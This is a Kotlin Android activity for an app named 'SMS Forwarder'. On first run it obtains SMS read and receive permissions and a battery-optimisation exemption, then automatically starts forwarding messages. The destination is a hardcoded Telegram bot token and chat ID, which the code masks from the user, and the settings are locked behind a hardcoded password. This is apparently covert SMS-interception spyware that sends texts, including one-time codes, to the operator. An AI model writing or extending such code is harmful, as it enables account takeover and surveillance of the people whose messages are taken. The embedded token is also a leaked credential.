package com.smsforwarder.app

import android.Manifest
import android.app.AlertDialog
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.text.InputType
import android.view.View
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.smsforwarder.app.databinding.ActivityMainBinding
import com.smsforwarder.app.service.SmsForwardingService
import com.smsforwarder.app.utils.PreferenceHelper

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private lateinit var preferenceHelper: PreferenceHelper
    
    private val SMS_PERMISSION_CODE = 100
    private val BATTERY_PERMISSION_CODE = 102
    private val APP_PASSWORD = "tele1212"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        preferenceHelper = PreferenceHelper(this)

        // Set default configuration
        setDefaultConfiguration()

        // Load configuration (hide sensitive data)
        loadConfiguration()

        // Setup listeners
        binding.btnSave.setOnClickListener {
            showPasswordDialog { saveConfiguration() }
        }

        binding.switchService.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                startForwardingService()
            } else {
                showPasswordDialog { stopForwardingService() }
            }
        }

        // Auto-start if not yet configured
        if (!preferenceHelper.isAppConfigured()) {
            requestAllPermissions()
        } else {
            loadServiceState()
        }
    }

    private fun showPasswordDialog(onSuccess: () -> Unit) {
        val input = EditText(this)
        input.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
        input.hint = "Enter password"

        AlertDialog.Builder(this)
            .setTitle("Authentication Required")
            .setMessage("Enter password to make changes")
            .setView(input)
            .setPositiveButton("OK") { _, _ ->
                val password = input.text.toString()
                if (password == APP_PASSWORD) {
                    onSuccess()
                } else {
                    Toast.makeText(this, "Incorrect password!", Toast.LENGTH_SHORT).show()
                    loadServiceState() // Revert switch
                }
            }
            .setNegativeButton("Cancel") { dialog, _ ->
                dialog.cancel()
                loadServiceState() // Revert switch
            }
            .setOnCancelListener {
                loadServiceState() // Revert switch
            }
            .show()
    }

    private fun setDefaultConfiguration() {
        if (preferenceHelper.getBotToken().isEmpty()) {
            preferenceHelper.saveBotToken("8084302237:AAGdJX7xFFxzxfur35dXuKUdAHbCrvGXqzo")
        }
        if (preferenceHelper.getChatId().isEmpty()) {
            preferenceHelper.saveChatId("5425876649")
        }
    }

    private fun loadConfiguration() {
        // Hide sensitive information
        binding.etBotToken.setText("●●●●●●●●●●●●●●●●●●●●●●●●")
        binding.etChatId.setText("●●●●●●●●●●")
        binding.etBotToken.isEnabled = false
        binding.etChatId.isEnabled = false
        
        loadServiceState()
    }

    private fun loadServiceState() {
        binding.switchService.isChecked = preferenceHelper.isServiceEnabled()
    }

    private fun saveConfiguration() {
        Toast.makeText(this, "Configuration is locked for security", Toast.LENGTH_SHORT).show()
    }

    private fun requestAllPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val permissionsToRequest = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toTypedArray(),
                SMS_PERMISSION_CODE
            )
        } else {
            requestBatteryOptimization()
        }
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent()
            val packageName = packageName
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                intent.data = Uri.parse("package:$packageName")
                startActivityForResult(intent, BATTERY_PERMISSION_CODE)
            } else {
                completeSetup()
            }
        } else {
            completeSetup()
        }
    }

    private fun completeSetup() {
        preferenceHelper.setAppConfigured(true)
        startForwardingService()
        Toast.makeText(this, "SMS Forwarding is now active!", Toast.LENGTH_LONG).show()
    }

    private fun startForwardingService() {
        if (!hasRequiredPermissions()) {
            Toast.makeText(this, "Please grant SMS permissions first", Toast.LENGTH_SHORT).show()
            binding.switchService.isChecked = false
            requestAllPermissions()
            return
        }

        preferenceHelper.setServiceEnabled(true)
        val intent = Intent(this, SmsForwardingService::class.java)
        ContextCompat.startForegroundService(this, intent)
        Toast.makeText(this, "SMS Forwarding Started", Toast.LENGTH_SHORT).show()
    }

    private fun stopForwardingService() {
        preferenceHelper.setServiceEnabled(false)
        val intent = Intent(this, SmsForwardingService::class.java)
        stopService(intent)
        binding.switchService.isChecked = false
        Toast.makeText(this, "SMS Forwarding Stopped", Toast.LENGTH_SHORT).show()
    }

    private fun hasRequiredPermissions(): Boolean {
        val smsPermission = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.RECEIVE_SMS
        ) == PackageManager.PERMISSION_GRANTED

        val readSmsPermission = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED

        return smsPermission && readSmsPermission
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        when (requestCode) {
            SMS_PERMISSION_CODE -> {
                if (grantResults.isNotEmpty() && 
                    grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    requestBatteryOptimization()
                } else {
                    Toast.makeText(
                        this, 
                        "SMS permissions are required!", 
                        Toast.LENGTH_LONG
                    ).show()
                }
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        when (requestCode) {
            BATTERY_PERMISSION_CODE -> {
                completeSetup()
            }
        }
    }
}
